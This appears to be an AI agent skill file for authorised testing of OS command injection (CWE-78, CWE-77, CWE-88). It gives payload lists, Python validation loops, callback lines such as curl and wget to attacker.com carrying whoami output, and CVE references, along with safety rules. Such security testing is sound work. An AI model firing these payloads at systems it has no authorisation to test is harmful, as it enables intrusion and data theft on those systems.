---
name: command-injection-testing
description: Validate OS Command Injection vulnerabilities including direct command injection, blind command injection via time delays, and out-of-band command execution. Test by injecting shell metacharacters and commands into user-controlled inputs. Use when testing CWE-78 (OS Command Injection), CWE-77 (Command Injection), CWE-88 (Argument Injection), or related command execution vulnerabilities.
allowed-tools: Read, Write, Bash
---

# Command Injection Testing Skill

## Purpose
Validate command injection vulnerabilities by injecting shell metacharacters and OS commands into user-controlled inputs and observing:
- **Direct output** of command execution in response
- **Time-based delays** indicating blind command execution
- **Out-of-band callbacks** (DNS/HTTP) confirming execution
- **Error messages** revealing command parsing
- **File system changes** from injected commands

## Vulnerability Types Covered

### 1. Direct OS Command Injection (CWE-78)
Inject commands that execute and return output in the response.

**Detection Methods:**
- Inject `; id` or `| whoami` and observe command output
- Inject `& dir` (Windows) and observe directory listing
- Look for shell command results in response body

**Example Payloads:**
```
; id
| whoami
`id`
$(whoami)
& dir
| type C:\windows\win.ini
```

### 2. Blind Command Injection - Time-Based (CWE-78)
Inject time-delay commands when output is not reflected.

**Detection Methods:**
- Inject `; sleep 5` and measure response delay
- Inject `| ping -c 5 127.0.0.1` and measure delay
- Inject `& timeout /t 5` (Windows) and measure delay

**Example Payloads:**
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1
& timeout /t 5      (Windows)
| ping -n 5 127.0.0.1   (Windows)
```

### 3. Blind Command Injection - Out-of-Band (CWE-78)
Confirm execution via external DNS/HTTP callbacks.

**Detection Methods:**
- Inject `; curl http://attacker.com/callback`
- Inject `; nslookup attacker.com`
- Inject `| wget http://attacker.com/?data=$(whoami)`
- Monitor callback server for requests

**Example Payloads:**
```
; curl http://collaborator.com/
; nslookup collaborator.com
; wget http://collaborator.com/?d=$(whoami)
| ping collaborator.com
$(curl http://collaborator.com/$(whoami))
```

### 4. Argument Injection (CWE-88)
Inject additional arguments to existing commands.

**Detection Methods:**
- Inject `--help` or `-v` to trigger help/version output
- Inject `--output=/tmp/test` to write files
- Inject arguments that modify command behavior

**Example Payloads:**
```
--help
--version
-v
--output=/tmp/test
-o /tmp/test
```

### 5. Command Injection via Different Contexts

**Shell Metacharacters:**
| Character | Unix/Linux | Windows | Description |
|-----------|------------|---------|-------------|
| `;` | ✓ | ✗ | Command separator |
| `|` | ✓ | ✓ | Pipe |
| `||` | ✓ | ✓ | OR - execute if previous fails |
| `&` | ✓ | ✓ | Background (Unix) / Separator (Win) |
| `&&` | ✓ | ✓ | AND - execute if previous succeeds |
| `` ` `` | ✓ | ✗ | Command substitution (backticks) |
| `$()` | ✓ | ✗ | Command substitution |
| `>` | ✓ | ✓ | Redirect output |
| `<` | ✓ | ✓ | Redirect input |
| `\n` | ✓ | ✗ | Newline (command separator) |

## Platform-Specific Notes

| Platform | Shell | Time Delay | Callback | Notes |
|----------|-------|------------|----------|-------|
| Linux/Unix | bash/sh | `sleep 5` | `curl`, `wget`, `nslookup` | Most metacharacters work |
| Windows | cmd.exe | `timeout /t 5`, `ping -n 5 127.0.0.1` | `nslookup`, `certutil` | Limited metacharacters |
| Windows | PowerShell | `Start-Sleep -s 5` | `Invoke-WebRequest` | Different syntax |
| macOS | zsh/bash | `sleep 5` | `curl`, `nslookup` | Similar to Linux |

## Prerequisites
- Target application that executes OS commands with user input
- Identified injection points (parameters, headers, file uploads, filenames)
- For blind testing: controlled callback server (collaborator domain)
- VULNERABILITIES.json with suspected command injection findings if provided

## Testing Methodology

### Phase 1: Identify Injection Points
Common injection vectors:
- URL parameters passed to system commands
- File upload filenames (often passed to file utilities)
- User-Agent/Referer headers (sometimes logged via shell)
- PDF generators, image processors, file converters
- Network utilities (ping, traceroute, nslookup forms)
- Git/SVN operations, backup tools
- Email functionality (often uses sendmail)

### Phase 2: Establish Baseline
- Send normal request; record response content, status, and timing
- Note any error messages or command-related output
- Identify target OS from response headers, errors, or behavior

### Phase 3: Execute Command Injection Tests

**Direct Command Injection:**
```python
payloads = ["; id", "| whoami", "`id`", "$(whoami)"]
for payload in payloads:
    resp = get(f"/ping?host=127.0.0.1{payload}")
    if "uid=" in resp.text or "root" in resp.text:
        status = "VALIDATED"
```

**Time-Based Blind Command Injection:**
```python
baseline_time = measure_response("/ping?host=127.0.0.1")
payloads = ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)"]

for payload in payloads:
    start = time.time()
    resp = get(f"/ping?host=127.0.0.1{payload}")
    elapsed = time.time() - start
    
    if elapsed > baseline_time + 4.5:
        status = "VALIDATED"
```

**Out-of-Band Command Injection:**
```python
callback = "unique-id.collaborator.com"
payloads = [
    f"; nslookup {callback}",
    f"| curl http://{callback}/",
    f"`nslookup {callback}`",
]

for payload in payloads:
    post("/convert", data={"filename": f"test.pdf{payload}"})

if collaborator_received_dns_or_http():
    status = "VALIDATED"
```

**Windows-Specific Testing:**
```python
payloads = [
    "& dir",
    "| type C:\\windows\\win.ini",
    "& timeout /t 5",
    "| ping -n 5 127.0.0.1",
]
```

### Phase 4: Classification Logic

| Status | Meaning |
|--------|---------|
| **VALIDATED** | Command output visible, time delay confirmed, or OOB callback received |
| **FALSE_POSITIVE** | Input properly escaped/sanitized, no execution indicators |
| **PARTIAL** | Some metacharacters blocked but others pass through |
| **UNVALIDATED** | Blocked by WAF, error, or insufficient evidence |

**Validation Criteria:**
- Command output (e.g., `uid=`, `root:`, directory listings) appears in response
- Response time increases by expected delay duration (±0.5s tolerance)
- DNS/HTTP callback received from target server
- Error messages reveal shell command syntax

### Phase 5: Capture Evidence
Capture minimal structured evidence (redact PII/secrets, truncate to 8KB, hash full response):
- `status`, `injection_type`, `cwe`
- Baseline request (url, method, status, response_time)
- Test request (url, method, status, response_time, payload)
- Command output snippet or callback details
- Platform detected (Linux/Windows)

### Phase 6: Safety Rules
- Detection-only payloads; use benign commands (`id`, `whoami`, `hostname`, `sleep`)
- NEVER use destructive commands (`rm`, `del`, `format`, `shutdown`)
- NEVER exfiltrate sensitive data; use callbacks only to confirm execution
- Prefer time-based over OOB when possible (less network impact)
- Use minimal sleep durations (5 seconds max)
- Stop immediately if unexpected behavior or server impact detected

## Output Guidelines
- Keep responses concise (1-4 sentences)
- Include endpoint, payload, detection method, and impact

**Validated examples:**
```
Direct command injection on /ping - ; id payload returned uid=33(www-data) (CWE-78). Full RCE possible.
Blind command injection on /convert - sleep 5 caused 5.2s delay (CWE-78). Time-based blind confirmed.
OOB command injection on /export - nslookup callback received (CWE-78). Command execution confirmed.
Argument injection on /backup - --help revealed rsync options (CWE-88). Command behavior modifiable.
```

**Unvalidated example:**
```
Command injection test incomplete on /api/exec - all metacharacters appear escaped. Evidence: path/to/evidence.json
```

## CWE Mapping

**Primary CWEs (DAST-testable):**
- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - This is THE designated CWE for OS command injection
  - Alternate terms: Shell injection, Shell metacharacters, OS Command Injection
  - High likelihood of exploit per MITRE

- **CWE-77:** Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - Parent class covering command injection in general
  - Includes non-OS command contexts (e.g., mail commands, LDAP)

- **CWE-88:** Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')
  - Injecting arguments to existing commands
  - CanAlsoBe relationship with CWE-78

**Parent/Related CWEs (context):**
- **CWE-74:** Improper Neutralization of Special Elements in Output ('Injection') — grandparent class
- **CWE-20:** Improper Input Validation — related root cause
- **CWE-116:** Improper Encoding or Escaping of Output — related mitigation failure

**Related Attack Patterns:**
- **CAPEC-88:** OS Command Injection
- **CAPEC-15:** Command Delimiters
- **CAPEC-6:** Argument Injection
- **CAPEC-108:** Command Line Execution through SQL Injection (chained)

**OWASP Classification:**
- OWASP Top Ten 2021: A03 - Injection

## Notable CVEs (examples)
- **CVE-2024-46256 (Nginx Proxy Manager):** Command injection via Let's Encrypt certificate feature (CVSS 9.8).
- **CVE-2024-3400 (Palo Alto PAN-OS):** Pre-auth command injection in GlobalProtect leading to RCE.
- **CVE-2023-1389 (TP-Link Archer AX21):** Command injection via web management interface, widely exploited.
- **CVE-2023-46747 (F5 BIG-IP):** Authentication bypass + command injection leading to RCE.
- **CVE-2022-42475 (FortiOS):** Heap overflow with command injection in SSL-VPN.
- **CVE-2021-22205 (GitLab):** Command injection via image processing (ExifTool).
- **CVE-2021-44228 (Log4Shell):** While JNDI injection, enables command execution via LDAP.
- **CVE-2019-19781 (Citrix ADC):** Path traversal + command injection leading to RCE.

## Safety Reminders
- ONLY test against user-approved targets; stop if production protections trigger
- Use benign, non-destructive commands only (`id`, `whoami`, `hostname`, `sleep`, `ping`)
- NEVER use `rm`, `del`, `format`, `shutdown`, or any destructive command
- OOB callbacks only to domains you control
- Prefer time-based detection over command output when possible
- Use input validation, parameterization, and avoid shell execution in mitigations

## Reference Implementations
- See `reference/cmdi_payloads.py` for command injection payloads by platform and detection type
- See `reference/validate_cmdi.py` for command injection validation flow
- See `examples.md` for concrete command injection scenarios and evidence formats

### Additional Resources
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackTricks Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [CISA Secure by Design - Eliminating OS Command Injection](https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-os-command-injection-vulnerabilities)
